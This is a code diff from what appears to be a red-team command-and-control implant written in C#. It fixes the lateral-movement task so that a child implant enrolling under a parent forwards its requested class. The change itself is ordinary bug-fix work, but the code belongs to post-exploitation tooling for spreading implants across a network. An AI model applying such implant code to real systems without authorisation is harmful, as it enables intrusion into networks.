@@ -47,7 +47,7 @@ internal static class Lateral
         if (enroll is null)
             return (TaskOutcome.Failed, "lateral.move is not available (no enroll bundle)");
 
-        if (!TryParseArgs(arguments, out var token, out _))
+        if (!TryParseArgs(arguments, out var token, out var requestedClass))
             return (TaskOutcome.Failed, "lateral.move expects '<token>' or '<token> <class>'");
 
         // A child owns its own keypair; only the public half crosses enroll
@@ -56,10 +56,12 @@ internal static class Lateral
         try
         {
             // The child enrolls against the same endpoint, naming this implant as
-            // parent. The server resolves and scope-checks the parent before
-            // recording the linkage (architecture.md Sec 10.1).
+            // parent and forwarding the requested class so a non-default class is
+            // honored instead of silently defaulting to stage-2. The server
+            // resolves and scope-checks the parent before recording the linkage
+            // (architecture.md Sec 10.1).
             var enrolled = await C2.EnrollAsync(
-                enroll.Url, token, enroll.ParentId, childKey, enroll.CAs, enroll.Profile);
+                enroll.Url, token, enroll.ParentId, childKey, enroll.CAs, enroll.Profile, requestedClass);
             // Report the child id so the operator can confirm the recorded lineage.
             // The server echoes the parent back, so include it when present as an
             // independent confirmation the linkage landed.
